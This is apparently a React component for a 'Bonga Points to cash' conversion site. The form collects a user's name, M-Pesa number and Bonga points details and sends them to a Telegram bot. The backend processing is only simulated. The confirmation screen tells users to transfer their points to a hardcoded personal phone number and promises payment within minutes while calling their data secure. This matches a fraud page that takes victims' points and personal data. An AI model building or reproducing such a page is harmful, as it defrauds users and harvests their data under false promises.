import React,{useState} from 'react'

const BongaForm = () => {
    const [formData, setFormData] = useState({
        name: '',
        mpesaNumber: '',
        bongaNumber: '',
        bongaPoints: '',
    })
    const [submitted, setSubmitted] = useState(false)
    const [submittedData, setSubmittedData] = useState(null)
    const [loading, setLoading] = useState(false)
    const [telegramError, setTelegramError] = useState('')

    const handleChange = (e) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))
  }

  const bongaPoints = parseInt(formData.bongaPoints) || 0
  const cashAmount = (bongaPoints * 0.12).toFixed(2)

  const sendTelegramNotification = async (data, amount) => {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      console.warn('Telegram bot token or chat ID is missing. Skipping notification.')
      return
    }

    const message = `New conversion request:\nName: ${data.name}\nM-Pesa: +254${data.mpesaNumber}\nBonga Number: ${data.bongaNumber}\nBonga Points: ${data.bongaPoints}\nAmount: KSH ${amount}`

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })

    if (!response.ok) {
      const errorText = await response.text()
      throw new Error(`Telegram send failed: ${errorText}`)
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setLoading(true)
    setTelegramError('')

    try {
      // Simulate API call
      await new Promise((resolve) => setTimeout(resolve, 1500))

      await sendTelegramNotification(formData, cashAmount)

      // Snapshot values for confirmation before we reset the form
      setSubmittedData({
        cashAmount,
        mpesaNumber: formData.mpesaNumber,
      })

      setSubmitted(true)
      setFormData({
        name: '',
        mpesaNumber: '',
        bongaNumber: '',
        bongaPoints: '',
      })
    } catch (error) {
      console.error(error)
      setTelegramError('Unable to send the Telegram notification. Please check your bot settings.')
    } finally {
      setLoading(false)
    }

    // Reset after 5 seconds
    //setTimeout(() => setSubmitted(false), 5000)
  }

  const isFormValid =
    formData.name.trim() &&
    formData.mpesaNumber.trim() &&
    formData.bongaNumber.trim() &&
    formData.bongaPoints.trim() &&
    parseInt(formData.bongaPoints) >= 250

  if (submitted) {
    return (
      <div className="space-y-6 text-center py-12">
        <div className="mx-auto w-16 h-16 rounded-full bg-[#1ea84c]/10 flex items-center justify-center">
          <svg className="w-8 h-8 text-[#1ea84c]" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
          </svg>
        </div>
        <div>
          <h3 className="text-2xl font-bold text-[#0f172a] mb-2">Request Submitted!</h3>
             <p className="text-[#666666]">
               We&apos;ve received your conversion request for <span className="font-semibold text-[#0f172a]">KSH {submittedData ? submittedData.cashAmount : cashAmount}</span>
          </p>
          <p className='text-lg font-semibold'>Transfer your Bonga Points to <span className='font-bold text-[#1ea84c]'>0728482191</span></p>
             <p className="text-md text-[#666666] mt-2">
               Funds will be sent to {submittedData ? submittedData.mpesaNumber : formData.mpesaNumber} within 5 minutes after we confirm the points transfer. Thank you !
          </p>
        </div>
        <ul className='font-semibold text-lg'>
            <li>Step 1 : Dial * 126 #</li>
            <li>Step 2 : Select 5 (Transfer Points)</li>
            <li>Step 3 : Enter the number 0728482191</li>
        </ul>
      </div>
    )
  }
  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      {/* Name */}
      <div>
        <label htmlFor="name" className="block text-sm font-semibold text-[#0f172a] mb-2">
          Full Name
        </label>
        <input
          type="text"
          id="name"
          name="name"
          value={formData.name}
          onChange={handleChange}
          placeholder="John Doe"
          className="w-full px-4 py-2.5 rounded-lg border border-[#1ea84c] bg-[#ffffff] text-[#0f172a] placeholder-[#666666] focus:outline-none focus:ring-2 focus:ring-[#1ea84c] focus:border-transparent transition-all"
          required
        />
      </div>

      {/* M-Pesa Number */}
      <div>
        <label htmlFor="mpesaNumber" className="block text-sm font-semibold text-[#0f172a] mb-2">
          M-Pesa Number
        </label>
        <div className="flex">
          <span className="inline-flex items-center px-4 bg-[#f5f5f5] text-[#666666] border border-[#1ea84c] border-r-0 rounded-l-lg font-medium">
            +254
          </span>
          <input
            type="tel"
            id="mpesaNumber"
            name="mpesaNumber"
            value={formData.mpesaNumber}
            onChange={handleChange}
            placeholder="712345678"
            className="flex-1 px-4 py-2.5 rounded-r-lg border border-[#1ea84c] bg-[#ffffff] text-[#0f172a] placeholder-[#666666] focus:outline-none focus:ring-2 focus:ring-[#1ea84c] focus:border-transparent transition-all"
            required
          />
        </div>
        <p className="mt-2 text-sm text-[#666666]">Enter the number without the +254 prefix</p>
      </div>

      {/* Bonga Number */}
      <div>
        <label htmlFor="bongaNumber" className="block text-sm font-semibold text-[#0f172a] mb-2">
          Bonga Points Number
        </label>
        <input
          type="text"
          id="bongaNumber"
          name="bongaNumber"
          value={formData.bongaNumber}
          onChange={handleChange}
          placeholder="e.g., 0712345678"
          className="w-full px-4 py-2.5 rounded-lg border border-[#1ea84c] bg-[#ffffff] text-[#0f172a] placeholder-[#666666] focus:outline-none focus:ring-2 focus:ring-[#1ea84c] focus:border-transparent transition-all"
          required
        />
        <p className="mt-2 text-sm text-[#666666]">The phone number holding your Bonga points</p>
      </div>

      {/* Bonga Points */}
      <div>
        <label htmlFor="bongaPoints" className="block text-sm font-semibold text-[#0f172a] mb-2">
          Amount of Bonga Points (Min 250)
        </label>
        <input
          type="number"
          id="bongaPoints"
          name="bongaPoints"
          value={formData.bongaPoints}
          onChange={handleChange}
          placeholder="5000"
          min="250"
          className="w-full px-4 py-2.5 rounded-lg border border-[#1ea84c] bg-[#ffffff] text-[#0f172a] placeholder-[#666666] focus:outline-none focus:ring-2 focus:ring-[#1ea84c] focus:border-transparent transition-all"
          required
        />
      </div>

      {/* Cash Conversion Summary */}
      {parseInt(formData.bongaPoints) >= 250 && (
        <div className="rounded-lg bg-[#f5f5f5] border border-[#1ea84c] p-4">
          <p className="text-sm text-[#666666] mb-1">You will receive</p>
          <p className="text-3xl font-bold text-[#0f172a]">
            KSH {cashAmount}
          </p>
          <p className="text-xs text-[#666666] mt-2">
            {formData.bongaPoints} points × KSH 0.12 per point
          </p>
        </div>
      )}

      {/* Submit Button */}
      <button
        type="submit"
        disabled={!isFormValid || loading}
        className="w-full bg-[#1ea84c] hover:bg-[#1ea84c]/90 text-[#ffffff] font-semibold py-3 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
      >
        {loading ? (
          <>
            <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
            </svg>
            Processing...
          </>
        ) : (
          <>
            Convert Points
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
            </svg>
          </>
        )}
      </button>

      {telegramError && (
        <p className="text-center text-sm text-red-600 mt-2">{telegramError}</p>
      )}

      <p className="text-center text-md text-[#666666]">
        Your information is secure and only used to process your request
      </p>
    </form>
  )
}

export default BongaForm